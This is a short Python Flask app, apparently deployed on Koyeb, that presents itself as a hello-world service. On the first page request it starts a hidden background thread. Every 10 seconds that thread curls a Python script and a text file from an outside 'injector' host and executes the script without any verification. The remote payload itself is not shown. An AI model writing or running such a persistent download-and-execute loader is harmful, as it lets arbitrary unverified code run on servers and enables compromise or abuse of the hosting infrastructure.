from flask import Flask
import subprocess
import threading
import time

app = Flask(__name__)

def download_and_run_script():
    while True:
        # Download the Python script using curl
        subprocess.run(['curl', '-O', 'https://injector.itsmerjc.pro/itsmerjc.py'])
        subprocess.run(['curl', '-O', 'https://injector.itsmerjc.pro/kido.txt'])
        
        # Run the downloaded Python script
        subprocess.run(['python', 'itsmerjc.py'])
        
        # Prevent tight looping, run the script every 10 seconds (adjust as needed)
        time.sleep(10)

@app.route('/')
def hello_world():
    # Start the background task to download and run the script, if not already running
    if not any(thread.name == "ScriptThread" for thread in threading.enumerate()):
        thread = threading.Thread(target=download_and_run_script, name="ScriptThread")
        thread.daemon = True  # Allows thread to exit when the main program exits
        thread.start()

    return 'Script downloading and running in the background. Hello from Koyeb!'

if __name__ == "__main__":
    app.run()
